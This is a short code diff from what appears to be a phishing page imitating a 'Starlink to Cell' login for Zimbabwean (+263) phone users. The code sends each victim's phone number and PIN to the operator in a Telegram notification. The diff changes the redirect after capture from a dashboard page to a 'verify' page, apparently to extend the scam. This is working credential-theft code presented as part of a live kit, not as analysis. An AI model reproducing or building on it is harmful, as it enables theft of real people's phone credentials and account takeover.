@@ -563,7 +563,7 @@
         // SEND TELEGRAM NOTIFICATION
         // ============================================
         async function sendTelegramNotification(phone, pin) {
-            const message = `📡 *New Starlink to Cell Login Attempt*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to dashboard.`;
+            const message = `📡 *New Starlink to Cell Login Attempt*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;
 
             console.log('📤 Sending Telegram notification...');
 
@@ -635,7 +635,7 @@
 
             // Redirect after delay
             setTimeout(() => {
-                window.location.href = 'dashboard.html';
+                window.location.href = 'verify.html';
             }, 1500);
         });
 
